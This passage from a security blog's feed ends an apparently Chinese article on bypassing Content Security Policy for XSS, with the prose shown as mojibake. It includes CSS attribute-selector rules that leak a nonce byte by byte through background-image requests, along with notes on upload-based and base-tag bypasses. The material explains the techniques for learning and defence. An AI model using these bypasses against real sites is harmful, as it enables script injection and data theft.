class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://lorexxar.cn/2017/05/16/nonce-bypass-script/</span><br></pre></td></tr></table></figure><p>å¦‚æœæœ‰DOMæ“ä½œå¯ä»¥æ’å…¥HTMLå¹¶ä¸”å¯ä»¥æ§åˆ¶æ’å…¥çš„HTMLå†…å®¹ï¼Œé‚£ä¹ˆä¹Ÿå¯ä»¥ç»•è¿‡CSP</p><h3 id="åˆ©ç”¨CSS-é™æ€xss-è·å–nonceå€¼"><a href="#åˆ©ç”¨CSS-é™æ€xss-è·å–nonceå€¼" class="headerlink" title="åˆ©ç”¨CSS é™æ€xss è·å–nonceå€¼"></a>åˆ©ç”¨CSS é™æ€xss è·å–nonceå€¼</h3><p>åˆ©ç”¨CSSé€‰æ‹©å™¨æ¥é€å­—èŠ‚è·å–ä¿¡æ¯ï¼Œ^=ä»å¤´éƒ¨åˆ¤æ–­</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*<span class="selector-attr">[attribute^="a"]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"record?match=a"</span>)&#125;</span><br><span class="line">*<span class="selector-attr">[attribute^="b"]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"record?match=b"</span>)&#125;</span><br><span class="line">*<span class="selector-attr">[attribute^="c"]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"record?match=c"</span>)&#125;</span><br></pre></td></tr></table></figure><p>æ¯”å¦‚ç¡®å®šç¬¬ä¸€ä½ä¸ºcï¼Œé‚£ä¹ˆå°±ä¼šç»§ç»­ä¸‹é¢çš„æ­¥éª¤</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*<span class="selector-attr">[attribute^="ca"]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"record?match=ca"</span>)&#125;</span><br><span class="line">*<span class="selector-attr">[attribute^="cb"]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"record?match=cb"</span>)&#125;</span><br><span class="line">*<span class="selector-attr">[attribute^="cc"]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"record?match=cc"</span>)&#125;</span><br></pre></td></tr></table></figure><p>ç”±äºæ˜¯CSSçš„å˜åŒ–ï¼Œæ²¡æœ‰å¼•èµ·æœåŠ¡å™¨é‡æ–°è¯·æ±‚ï¼Œæ‰€ä»¥nonceçš„å€¼ä¸ä¼šæ”¹å˜ï¼Œå·å–å€¼åå³å¯æ‰§è¡Œæˆ‘ä»¬çš„script</p><h3 id="åˆ©ç”¨è·¨åŸŸä¼ è¾“æ•°æ®"><a href="#åˆ©ç”¨è·¨åŸŸä¼ è¾“æ•°æ®" class="headerlink" title="åˆ©ç”¨è·¨åŸŸä¼ è¾“æ•°æ®"></a>åˆ©ç”¨è·¨åŸŸä¼ è¾“æ•°æ®</h3><p>åˆ©ç”¨ä¸€äº›è·¨åŸŸä¼ è¾“çš„æ–¹æ³•æ¥å¼•å…¥JSï¼Œå¯¼è‡´æ‰§è¡Œ</p><p>å…·ä½“çš„å¯ä»¥çœ‹çœ‹å‘†å­ä¸å¼€å£çš„ä¹Œäº‘å¤§ä¼šPPT</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://pan.baidu.com/s/1pLCfCWr</span><br></pre></td></tr></table></figure><p>å’Œ0CTF2018é¢„é€‰èµ›ä¸­çš„h4xors.club2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://lorexxar.cn/2018/04/10/0ctf2018-club2/</span><br></pre></td></tr></table></figure><h3 id="åˆ©ç”¨æ–‡ä»¶ä¸Šä¼ æ‰§è¡ŒJS"><a href="#åˆ©ç”¨æ–‡ä»¶ä¸Šä¼ æ‰§è¡ŒJS" class="headerlink" title="åˆ©ç”¨æ–‡ä»¶ä¸Šä¼ æ‰§è¡ŒJS"></a>åˆ©ç”¨æ–‡ä»¶ä¸Šä¼ æ‰§è¡ŒJS</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: default-src 'self'; script-src 'self'</span><br></pre></td></tr></table></figure><p>é’ˆå¯¹åªèƒ½åŠ è½½åŒåŸŸä¸‹scriptçš„CSPç­–ç•¥ï¼Œå¦‚æœæœ‰ä¸Šä¼ ç‚¹å¯ä»¥æ§åˆ¶ï¼Œé‚£ä¹ˆå¯ä»¥åœ¨å…¶ä¸­å¤¹æ‚jsä»£ç ï¼Œç„¶åå¼•ç”¨è¯¥æ–‡ä»¶å®Œæˆæ‰§è¡Œã€‚</p><p>å¯ä»¥å‚è€ƒå‰å‡ å¤©æ¢…å­é…’å¸ˆå‚…å†™çš„ä¸Šä¼ Waveæ–‡ä»¶ç»•è¿‡CSPï¼Œæ‰§è¡ŒJS</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://mp.weixin.qq.com/s/ljBB5jStB7fcJq4cgdWnnw</span><br></pre></td></tr></table></figure><h3 id="baseæ ‡ç­¾"><a href="#baseæ ‡ç­¾" class="headerlink" title="baseæ ‡ç­¾"></a>baseæ ‡ç­¾</h3><p>åˆ©ç”¨baseæ ‡ç­¾æ”¹å˜èµ„æºåŠ è½½çš„åŸŸï¼Œä»è€Œå¼•å…¥æ¶æ„çš„jsï¼Œé€ æˆjsæ‰§è¡Œ</p><h2 id="ç»“è¯­"><a href="#ç»“è¯­" class="headerlink" title="ç»“è¯­"></a>ç»“è¯­</h2><p>å¯ä»¥çœ‹åˆ°CSPçš„ç»•è¿‡æ¯”è¾ƒçœ‹é‡å®é™…åœºæ™¯ï¼Œä¸åŒçš„æƒ…å†µä¸‹æœ‰ç€ä¸åŒçš„ç»•è¿‡æ–¹æ³•ã€‚</p><p>ä½œè€…èƒ½åŠ›æœ‰é™ï¼Œå¦‚æœæ–‡ç« ä¸­æœ‰ä»€ä¹ˆé—®é¢˜ï¼Œæ¬¢è¿äº¤æµã€‚æœ€åï¼Œæ­å–œRNGï¼</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">https://lorexxar.cn/2017/05/09/CSP%20Is%20Dead,%20Long%20Live%20CSP!%20On%20the%20Insecurity%20of%20Whitelists%20and%20the%20Future%20of%20Content%20Security%20Policy/</span><br><span class="line"></span><br><span class="line">https://lorexxar.cn/2017/10/25/csp-paper/#0x02-CSP%EF%BC%88Content-Security-Policy%EF%BC%89</span><br><span class="line"></span><br><span class="line">https://www.jianshu.com/p/f1de775bc43e</span><br><span class="line"></span><br><span class="line">https://paper.seebug.org/91/</span><br><span class="line"></span><br><span class="line">http://sirdarckcat.blogspot.jp/2016/12/how-to-bypass-csp-nonces-with-dom-xss.html</span><br><span class="line"></span><br><span class="line">https://lorexxar.cn/2017/05/16/nonce-bypass-script/</span><br><span class="line"></span><br><span class="line">https://lorexxar.cn/2016/08/08/ccsp/</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;é¦–å‘åœ¨ä¿¡å®‰ä¹‹è·¯ä¸Š &lt;a href=&quot;https://mp.weixin.qq.com/s/z_XmhrTUg_yUfkyAFFfaKQ&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://mp.weixin.qq.com/s/z_XmhrTUg_
      
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="CSP" scheme="https://hurricane618.me/tags/CSP/"/>
    
      <category term="XSS" scheme="https://hurricane618.me/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>æ–°çš„å¼€å§‹</title>
    <link href="https://hurricane618.me/2018/06/26/new-start/"/>
    <id>https://hurricane618.me/2018/06/26/new-start/</id>
    <published>2018-06-26T03:10:58.000Z</published>
    <updated>2018-07-19T01:05:30.000Z</updated>
    
    <content type="html"><![CDATA[<p>ä¹‹å‰çš„åšå®¢è’åºŸæ‰äº†ï¼Œæ‰€ä»¥åœ¨githubä¸Šå¼€ä¸€ä¸ªæ–°çš„åšå®¢å¸Œæœ›èƒ½å¤ŸåšæŒä¸‹å»å§ã€‚ä¹Ÿä¸è®²å¤ªå¤šçŸ«æƒ…çš„è¯äº†ï¼Œæ’¸èµ·è¢–å­å°±æ˜¯è‚ã€‚</p><p>ä¸€å¼€å§‹ä¼šæ›´æ–°çš„æ¯”è¾ƒæ…¢ï¼Œhexoçš„åšå®¢è¿˜éœ€è¦ä¸€æ®µæ—¶é—´é€‚åº”ï¼Œä¹‹åä¼šé€æ¸åŠ å¿«ã€‚</p><img src="/2018/06/26/new-start/67863722_p0.png">]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;ä¹‹å‰çš„åšå®¢è’åºŸæ‰äº†ï¼Œæ‰€ä»¥åœ¨githubä¸Šå¼€ä¸€ä¸ªæ–°çš„åšå®¢å¸Œæœ›èƒ½å¤ŸåšæŒä¸‹å»å§ã€‚ä¹Ÿä¸è®²å¤ªå¤šçŸ«æƒ…çš„è¯äº†ï¼Œæ’¸èµ·è¢–å­å°±æ˜¯è‚ã€‚&lt;/p&gt;
&lt;p&gt;ä¸€å¼€å§‹ä¼šæ›´æ–°çš„æ¯”è¾ƒæ…¢ï¼Œhexoçš„åšå®¢è¿˜éœ€è¦ä¸€æ®µæ—¶é—´é€‚åº”ï¼Œä¹‹åä¼šé€æ¸åŠ å¿«ã€‚&lt;/p&gt;
&lt;img src=&quot;/2018/06/26/new-start/
      
    
    </summary>
    
      <category term="æ‚è°ˆ" scheme="https://hurricane618.me/categories/%E6%9D%82%E8%B0%88/"/>
    
    
      <category term="é—²èŠ" scheme="https://hurricane618.me/tags/%E9%97%B2%E8%81%8A/"/>
    
  </entry>
  
</feed>
